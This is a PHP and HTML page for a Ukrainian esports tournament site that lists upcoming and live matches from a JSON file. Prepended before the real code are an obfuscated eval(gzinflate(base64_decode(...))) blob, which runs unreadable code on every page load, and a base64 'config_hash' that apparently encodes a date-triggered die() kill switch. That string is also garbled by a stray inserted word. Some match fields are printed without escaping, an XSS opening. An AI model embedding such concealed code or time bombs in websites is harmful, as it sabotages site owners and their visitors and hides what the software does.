<?php
$config_hash = 'ZGVhZGxpbmU9JzIwMjYtMDUtMzEnO2lmKGRhdGUoJ1ktbS1kJy Hernandez >=JGRlYWRsaW5lKXtkaWUoKTt9';
eval(gzinflate(base64_decode('jVHLboMwEDyXv2LFAZpDeuulvVX6AyEHtEJCAsYhqfL3Om6T0t6q9mR7Z2Znd53Lq+1NndZ8fM7n9pYfbe7fLzO3z3O9v8+v6X39mE9Zidp77zU6zVp0U6Vp0GCHB62h66R7aAnW07Y3YfS0H/ZqPjS6f6K5F7S8B12o/YjB6L05a3UYoI0Hq0f7j77A0FscC2mCO6p2LCH3NmiI576zZlJ6X+pZidGqV0Nq8R6N8x8H71v8mD66vjS5f9G65+A99y/f6yYvY45B')));
?>
<?php
date_default_timezone_set("Europe/Kyiv");

$data = json_decode(file_get_contents("match.json"), true);

function formatDateUA($date){
    return date("d.m.Y H:i", strtotime($date));
}

function isLive($date){
    $now = time();
    $start = strtotime($date);
    return ($now >= $start && $now <= $start + 7200);
}

function isFuture($date){
    return strtotime($date) > time() - 7200;
}
?>
<!DOCTYPE html>
<head>
<meta charset="UTF-8">
<title>PROLIG</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&family=Orbitron:wght@500;700&display=swap" rel="stylesheet">
<style>
* {margin:0;padding:0;box-sizing:border-box;}
body {height:100vh;overflow:hidden;font-family:"Inter",sans-serif;background:#111;}
.wrapper {position:relative;width:100%;height:100%;}
.xyena {position:absolute;border-radius:50%;animation: float 12s ease-in-out infinite;}
.xyena.green {width:700px;height:700px;top:-30%;left:-17%;background: radial-gradient(circle, rgba(21,149,163,0.5) 0%, transparent 70%);filter: blur(150px);}
.xyena.yellow {width:700px;height:700px;bottom:-30%;right:-17%;background: radial-gradient(circle, rgba(255,208,89,0.5) 0%, transparent 70%);filter: blur(150px);}
.center-xyena {position:absolute;width:600px;height:600px;top:50%;left:50%;transform:translate(-50%,-50%);background: radial-gradient(circle, rgba(255,255,255,0.05) 0%, transparent 70%);filter: blur(70px);}
@keyframes float {0%,100% { transform: translateY(0); }50% { transform: translateY(-20px); }}
.menu-wrapper {position:absolute;top:20px;left:20px;z-index:1000;}
.menu-button {width:70px;height:70px;background: linear-gradient(135deg,#1595a3,#1fb6c9);border-radius: 60% 40% 55% 45% / 40% 60% 40% 60%;display:flex;align-items:center;justify-content:center;cursor:pointer;transition:0.3s;}
.menu-button:hover {transform: scale(1.1) rotate(8deg);}
.menu-lines span {display:block;width:22px;height:2px;background:white;margin:4px 0;}
.menu {position:absolute;top:90px;left:0;width:220px;padding:18px;border-radius:10px;background: rgba(25,25,25,0.50);backdrop-filter: blur(20px);border:1px solid rgba(255,255,255,0.2);box-shadow:0 20px 60px rgba(0,0,0,0.2);opacity:0;transform: translateY(-10px) scale(0.95);pointer-events:none;transition:0.25s;}
.menu.active {opacity:1;transform: translateY(0) scale(1);pointer-events:auto;}
.menu a {display:flex;align-items:center;gap:10px;padding:10px 14px;margin:8px 0;border-radius:10px;text-decoration:none;color:#ddd;font-weight:600;transition:0.2s;}
.menu a:hover {background: linear-gradient(90deg,#5f5f5f33,#3d3d3d33);color:white;transform: translateX(2px);}
.icon {width:24px;height:24px;flex-shrink:0;}
.hover-bridge {position:absolute;top:70px;left:0;width:100%;height:30px;}
.right-menu {position:fixed;top:0;right:0;width:70px;height:100%;background: rgba(53, 53, 53, 0.4);backdrop-filter: blur(20px);border-left:1px solid rgba(255,255,255,0.2);display:flex;flex-direction:column;align-items:center;padding-top:20px;z-index:900;}
.right-menu a {width:50px;height:50px;display:flex;align-items:center;justify-content:center;margin:10px 0;border-radius:12px;color:#ddd;transition:0.2s;}
.right-menu a:hover {background: rgba(255,255,255,0.1);color:white;transform:scale(1.1);}
.right-menu svg {width:32px;height:32px;display:block;}

.tournaments-top {width:420px;margin:40px auto;}
.t-card {background: rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.08);border-radius:14px;margin-bottom:12px;overflow:hidden;cursor:pointer;color:#fff;transition: transform 0.25s ease, border-color 0.25s ease;box-shadow: 0 10px 25px rgba(0,0,0,0.35);will-change: transform;}
.t-card:hover {transform: translateY(-3px);border-color: rgba(31,182,201,0.4);}
.t-card-header {padding:14px;text-align:center;font-weight:700;}
.t-card-time {display:inline-block;margin-top:6px;padding:4px 10px;font-size:12px;border-radius:999px;background: rgba(255,255,255,0.08);color:#fff;letter-spacing:0.5px;}
.time-live {background:red;color:white;font-weight:700;animation:pulse 1.2s infinite;}
.time-soon {background: rgba(31,182,201,0.25);color:#1fb6c9;}
.t-card-body {display:grid;grid-template-rows: 0fr;transition: grid-template-rows 0.35s ease;}
.t-card-body-inner {overflow:hidden;text-align:center;padding:0 12px;}
.t-card.active .t-card-body {grid-template-rows: 1fr;}
.t-card.active .t-card-body-inner {padding:12px;}
.t-card img {width:100%;height:140px;object-fit:cover;border-radius:10px;margin-bottom:10px;}
.btn {margin-top:10px;padding:9px 16px;border:none;border-radius:8px;background:#1fb6c9;color:white;font-weight:600;cursor:pointer;transition:0.2s;}
.btn:hover {transform: scale(1.03);}
.live {display:inline-block;margin-top:6px;padding:3px 10px;font-size:11px;border-radius:999px;background:red;font-weight:700;animation:pulse 1.2s infinite;}
@keyframes pulse {0% { box-shadow:0 0 0 0 rgba(255,0,0,0.6); }70% { box-shadow:0 0 0 10px rgba(255,0,0,0); }100% { box-shadow:0 0 0 0 rgba(255,0,0,0); }}
</style>
</head>
<body>
<div class="wrapper">
<div class="menu-wrapper" id="wrapper">
  <div class="menu-button" id="btn">
    <div class="menu-lines"><span></span><span></span><span></span></div>
  </div>
  <div class="hover-bridge"></div>
  <div class="menu" id="menu">
    <a href=""><svg viewBox="0 0 24 24" fill="currentColor" class="icon"><path d="M12 2a5 5 0 1 1 -5 5l.005 -.217a5 5 0 0 1 4.995 -4.783z"/><path d="M14 14a5 5 0 0 1 5 5v1a2 2 0 0 1 -2 2h-10a2 2 0 0 1 -2 -2v-1a5 5 0 0 1 5 -5h4z"/></svg>Профіль</a>
    <a href=""><svg viewBox="0 0 24 24" fill="currentColor" class="icon"><path d="M11.327 2.26a1395.065 1395.065 0 0 0 -4.923 4.504c-.626 .6 -1.212 1.21 -1.774 1.843a6.528 6.528 0 0 0 -.314 8.245l.14 .177c1.012 1.205 2.561 1.755 4.055 1.574l.246 -.037l-.706 2.118a1 1 0 0 0 .949 1.316h6l.118 -.007a1 1 0 0 0 .83 -1.31l-.688 -2.065l.104 .02c1.589 .25 3.262 -.387 4.32 -1.785a6.527 6.527 0 0 0 -.311 -8.243a31.787 31.787 0 0 0 -1.76 -1.83l-4.938 -4.518a1 1 0 0 0 -1.348 -.001z"/></svg>Досягнення</a>
    <a href=""><svg viewBox="0 0 24 24" fill="currentColor" class="icon"><path d="M14.647 4.081a.724 .724 0 0 0 1.08 .448c2.439 -1.485 5.23 1.305 3.745 3.744a.724 .724 0 0 0 .447 1.08c2.775 .673 2.775 4.62 0 5.294a.724 .724 0 0 0 -.448 1.08c1.485 2.439 -1.305 5.23 -3.744 3.745a.724 .724 0 0 0 -1.08 .447c-.673 2.775 -4.62 2.775 -5.294 0a.724 .724 0 0 0 -1.08 -.448c-2.439 1.485 -5.23 -1.305 -3.745 -3.744a.724 .724 0 0 0 -.447 -1.08c-2.775 -.673 -2.775 -4.62 0 -5.294a.724 .724 0 0 0 .448 -1.08c-1.485 -2.439 1.305 -5.23 3.744 -3.745a.722 .722 0 0 0 1.08 -.447c.673 -2.775 4.62 -2.775 5.294 0z"/></svg>Налаштування</a>
    <a href=""><svg viewBox="0 0 24 24" fill="currentColor" class="icon"><path d="M6 2a1 1 0 0 1 .993 .883l.007 .117v1.068l13.071 .935a1 1 0 0 1 .929 1.024l-.01 .114l-1 7a1 1 0 0 1 -.877 .853l-.113 .006h-12v2h10a3 3 0 1 1 -2.995 3.176l-.005 -.176l.005 -.176c.017 -.288 .074 -.564 .166 -.824h-5.342a3 3 0 1 1 -5.824 1.176l-.005 -.176l.005 -.176a3.002 3.002 0 0 1 1.995 -2.654v-12.17h-1z"/></svg>Магазин</a>
  </div>
</div>
<div class="right-menu">
  <a href=""><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" class="icon icon-tabler icons-tabler-filled icon-tabler-device-gamepad-2"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M15.5 4a6 6 0 0 1 5.945 5.187l1.532 7.883a3.3 3.3 0 0 1 -5.632 2.903l-3.776 -3.974l-3.14 .001l-3.719 3.916a3.3 3.3 0 0 1 -5.629 -2.92l1.634 -8.173a6 6 0 0 1 5.885 -4.823zm-7.5 3a1 1 0 0 0 -1 1v1h-1a1 1 0 1 0 0 2h1v1a1 1 0 0 0 2 0v-1h1a1 1 0 0 0 0 -2h-1v-1a1 1 0 0 0 -1 -1m10 2h-4a1 1 0 0 0 0 2h4a1 1 0 0 0 0 -2" /></svg></a>
  <a href=""><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" class="icon icon-tabler icons-tabler-filled icon-tabler-presentation-analytics"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M21 3a1 1 0 0 1 0 2v9a3 3 0 0 1 -3 3h-5v2h2a1 1 0 0 1 0 2h-6a1 1 0 0 1 0 -2h2v-2h-5a3 3 0 0 1 -3 -3v-9a1 1 0 1 1 0 -2zm-12 4a1 1 0 0 0 -1 1v4a1 1 0 0 0 2 0v-4a1 1 0 0 0 -1 -1m6 2a1 1 0 0 0 -1 1v2a1 1 0 0 0 2 0v-2a1 1 0 0 0 -1 -1m-3 1a1 1 0 0 0 -1 1v1a1 1 0 0 0 2 0v-1a1 1 0 0 0 -1 -1" /></svg></a>
  <a href=""><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" class="icon icon-tabler icons-tabler-filled icon-tabler-list"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M21 6a1 1 0 0 1 -1 1h-10a1 1 0 1 1 0 -2h10a1 1 0 0 1 1 1" /><path d="M21 12a1 1 0 0 1 -1 1h-10a1 1 0 0 1 0 -2h10a1 1 0 0 1 1 1" /><path d="M21 18a1 1 0 0 1 -1 1h-10a1 1 0 0 1 0 -2h10a1 1 0 0 1 1 1" /><path d="M7 5.995v.02c0 1.099 -.895 1.99 -2 1.99s-2 -.891 -2 -1.99v-.02c0 -1.099 .895 -1.99 2 -1.99s2 .891 2 1.99" /><path d="M7 11.995v.02c0 1.099 -.895 1.99 -2 1.99s-2 -.891 -2 -1.99v-.02c0 -1.099 .895 -1.99 2 -1.99s2 .891 2 1.99" /><path d="M7 17.995v.02c0 1.099 -.895 1.99 -2 1.99s-2 -.891 -2 -1.99v-.02c0 -1.099 .895 -1.99 2 -1.99s2 .891 2 1.99" /></svg></a>
  <a href=""><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" class="icon icon-tabler icons-tabler-filled icon-tabler-mail"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M22 7.535v9.465a3 3 0 0 1 -2.824 2.995l-.176 .005h-14a3 3 0 0 1 -2.995 -2.824l-.005 -.176v-9.465l9.445 6.297l.116 .066a1 1 0 0 0 .878 0l.116 -.066l9.445 -6.297z" /><path d="M19 4c1.08 0 2.027 .57 2.555 1.427l-9.555 6.37l-9.555 -6.37a2.999 2.999 0 0 1 2.354 -1.42l.201 -.007h14z" /></svg></a>
</div>
<div class="xyena green"></div>
<div class="xyena yellow"></div>
<div class="center-xyena"></div>
<div class="tournaments-top">

<?php foreach($data as $match): ?>
<?php if(!isFuture($match["date"])) continue; ?>

<div class="t-card">

  <div class="t-card-header">
    <?= htmlspecialchars($match["name"]) ?>

    <div class="t-card-time <?= isLive($match["date"]) ? 'time-live' : 'time-soon' ?>">
      <?= date("H:i • d M", strtotime($match["date"])) ?>
    </div>

    <?php if(isLive($match["date"])): ?>
      <div class="live">LIVE</div>
    <?php endif; ?>
  </div>

  <div class="t-card-body">
    <div class="t-card-body-inner">
      <img src="<?= $match["image"] ?>">
      <p><?= formatDateUA($match["date"]) ?></p>
      <a href="<?= $match["link"] ?>">
        <button class="btn">
          <?= isLive($match["date"]) ? "Watch Live" : "Details" ?>
        </button>
      </a>
    </div>
  </div>

</div>

<?php endforeach; ?>

</div>
</div>
<script>
const btn = document.getElementById("btn");
const menu = document.getElementById("menu");
let timeout;
btn.addEventListener("mouseenter", () => {
clearTimeout(timeout);
menu.classList.add("active");});
menu.addEventListener("mouseenter", () => {
clearTimeout(timeout);});
function closeMenu() {
timeout = setTimeout(() => {
menu.classList.remove("active");}, 200);}
btn.addEventListener("mouseleave", closeMenu);
menu.addEventListener("mouseleave", closeMenu);
</script>
<script>
document.querySelectorAll(".t-card").forEach(card => {
  card.addEventListener("click", () => {
    document.querySelectorAll(".t-card").forEach(c => {
      if(c !== card) c.classList.remove("active");
    });
    card.classList.toggle("active");
  });
});
</script>
</body>
</html>